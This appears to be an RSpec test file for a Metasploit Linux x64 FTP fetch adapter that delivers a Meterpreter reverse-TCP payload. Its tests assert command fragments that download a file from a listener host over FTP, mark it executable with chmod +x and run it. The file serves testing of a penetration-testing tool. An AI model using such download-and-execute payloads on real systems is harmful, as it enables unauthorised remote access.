require 'rspec'

RSpec.describe 'cmd/linux/ftp/x64' do
  include_context 'Msf::Simple::Framework#modules loading'

  let(:subject) do
    load_and_create_module(
      module_type: 'payload',
      reference_name: 'cmd/linux/ftp/x64/meterpreter_reverse_tcp',
      ancestor_reference_names: [
        'adapters/cmd/linux/ftp/x64',
        'singles/linux/x64/meterpreter_reverse_tcp'
      ]
    )
  end

  let(:lhost)           { '192.168.1.100' }
  let(:lport)           { '4444' }
  let(:fetch_srvhost)   { '192.168.1.100' }
  let(:fetch_srvport)   { 4501 }
  let(:fetch_uripath)   { 'testpayload' }
  let(:fetch_filename)  { 'payload' }
  let(:fetch_writable_dir) { './' }

  let(:datastore_values) do
    {
      'LHOST'              => lhost,
      'LPORT'              => lport,
      'FETCH_SRVHOST'      => fetch_srvhost,
      'FETCH_SRVPORT'      => fetch_srvport,
      'FETCH_URIPATH'      => fetch_uripath,
      'FETCH_FILENAME'     => fetch_filename,
      'FETCH_WRITABLE_DIR' => fetch_writable_dir,
      'FETCH_FILELESS'     => 'none',
      'FETCH_PIPE'         => false,
      'FETCH_SRVONCE'      => false
    }
  end

  before(:each) { subject.datastore.merge!(datastore_values) }

  # ---------------------------------------------------------------------------
  # Module metadata
  # ---------------------------------------------------------------------------

  describe 'module metadata' do
    it 'includes FTP Fetch in the name' do
      expect(subject.name).to include('FTP Fetch')
    end

    it 'targets the Linux platform' do
      expect(subject.platform.platforms).to include(Msf::Module::Platform::Linux)
    end

    it 'uses CMD arch' do
      expect(subject.arch).to include(ARCH_CMD)
    end

    it 'adapts x64 payloads' do
      expect(subject.send(:module_info)['AdaptedArch']).to eq(ARCH_X64)
    end

    it 'has linux as the adapted platform' do
      expect(subject.send(:module_info)['AdaptedPlatform']).to eq('linux')
    end
  end

  # ---------------------------------------------------------------------------
  # Protocol and platform helpers
  # ---------------------------------------------------------------------------

  describe '#fetch_protocol' do
    it 'returns FTP' do
      expect(subject.fetch_protocol).to eq('FTP')
    end
  end

  describe '#windows?' do
    it 'returns false for this Linux module' do
      expect(subject.windows?).to be(false)
    end
  end

  # ---------------------------------------------------------------------------
  # FETCH_COMMAND option
  # ---------------------------------------------------------------------------

  describe 'FETCH_COMMAND option' do
    it 'defaults to FTP' do
      fresh = load_and_create_module(
        module_type: 'payload',
        reference_name: 'cmd/linux/ftp/x64/meterpreter_reverse_tcp',
        ancestor_reference_names: [
          'adapters/cmd/linux/ftp/x64',
          'singles/linux/x64/meterpreter_reverse_tcp'
        ]
      )
      expect(fresh.datastore['FETCH_COMMAND']).to eq('FTP')
    end

    # Only FTP, TNFTP, and GET have working command generators for the FTP
    # protocol (see #_generate_ftp_command, #_generate_tnftp_command, and
    # #_generate_get_command in lib/msf/core/payload/adapter/fetch.rb).
    # CURL, WGET, and TFTP have no FTP-protocol case and fail with BadConfig.
    %w[FTP TNFTP GET].each do |cmd|
      it "accepts #{cmd} as a valid enum value" do
        expect(subject.options['FETCH_COMMAND'].valid?(cmd)).to be(true)
      end
    end

    %w[CURL WGET TFTP CERTUTIL].each do |cmd|
      it "rejects #{cmd} as an invalid value" do
        expect(subject.options['FETCH_COMMAND'].valid?(cmd)).to be(false)
      end
    end
  end

  # ---------------------------------------------------------------------------
  # generate_fetch_commands — FTP, TNFTP, and GET are the commands compatible
  # with the FTP protocol; other commands raise at runtime.
  # ---------------------------------------------------------------------------

  describe '#generate_fetch_commands' do
    context 'with FTP' do
      before { subject.datastore['FETCH_COMMAND'] = 'FTP' }

      it 'uses ftp -Vo to download' do
        expect(subject.generate_fetch_commands).to include('ftp -Vo')
      end

      it 'includes the FTP URL with host, port, and URI path' do
        expect(subject.generate_fetch_commands).to include(
          "ftp://#{fetch_srvhost}:#{fetch_srvport}/#{fetch_uripath}"
        )
      end

      it 'makes the file executable and runs it' do
        cmd = subject.generate_fetch_commands
        expect(cmd).to include('chmod +x')
        expect(cmd).to include("#{fetch_writable_dir}#{fetch_filename}&")
      end
    end

    context 'with TNFTP' do
      before { subject.datastore['FETCH_COMMAND'] = 'TNFTP' }

      it 'uses tnftp -Vo to download' do
        expect(subject.generate_fetch_commands).to include('tnftp -Vo')
      end

      it 'includes the FTP URL with host, port, and URI path' do
        expect(subject.generate_fetch_commands).to include(
          "ftp://#{fetch_srvhost}:#{fetch_srvport}/#{fetch_uripath}"
        )
      end

      it 'makes the file executable and runs it' do
        cmd = subject.generate_fetch_commands
        expect(cmd).to include('chmod +x')
        expect(cmd).to include("#{fetch_writable_dir}#{fetch_filename}&")
      end
    end

    context 'with GET' do
      before { subject.datastore['FETCH_COMMAND'] = 'GET' }

      it 'uses GET to download over FTP' do
        expect(subject.generate_fetch_commands).to include('GET ftp://')
      end

      it 'includes the FTP URL with host, port, and URI path' do
        expect(subject.generate_fetch_commands).to include(
          "ftp://#{fetch_srvhost}:#{fetch_srvport}/#{fetch_uripath}"
        )
      end

      it 'makes the file executable and runs it' do
        cmd = subject.generate_fetch_commands
        expect(cmd).to include('chmod +x')
        expect(cmd).to include("#{fetch_writable_dir}#{fetch_filename}&")
      end
    end
  end
end
